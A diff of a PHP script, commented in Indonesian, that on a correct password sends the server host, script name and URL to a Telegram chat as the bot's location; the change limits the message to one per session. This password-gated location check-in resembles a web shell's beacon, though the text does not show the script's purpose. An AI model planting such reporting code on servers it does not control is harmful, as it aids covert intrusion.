@@ -29,19 +29,28 @@ function sendTelegramMessage($message) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $input_password = $_POST['password'];
 
+    // Pastikan Anda mendefinisikan $correct_password di suatu tempat
     if ($input_password === $correct_password) {
-        // Ambil informasi keberadaan bot
-        $server_info = "Host: " . $_SERVER['HTTP_HOST'] . "\n";
-        $script_name = "Nama Skrip: " . $_SERVER['SCRIPT_NAME'] . "\n";
-        $current_url = "URL: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "\n";
+        // Cek apakah pesan sudah dikirim dalam sesi ini
+        if (!isset($_SESSION['message_sent'])) {
+            // Ambil informasi keberadaan bot
+            $server_info = "Host: " . $_SERVER['HTTP_HOST'] . "\n";
+            $script_name = "Nama Skrip: " . $_SERVER['SCRIPT_NAME'] . "\n";
+            $current_url = "URL: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "\n";
 
-        // Buat pesan
-        $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url;
+            // Buat pesan
+            $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url;
 
-        // Kirim pesan
-        sendTelegramMessage($message);
+            // Kirim pesan
+            sendTelegramMessage($message);
 
-        echo "Pesan berhasil dikirim.";
+            // Tandai bahwa pesan sudah dikirim
+            $_SESSION['message_sent'] = true;
+
+            echo "Pesan berhasil dikirim.";
+        } else {
+            echo "Pesan sudah dikirim untuk sesi ini.";
+        }
     } else {
         echo "Password salah. Silakan coba lagi.";
     }
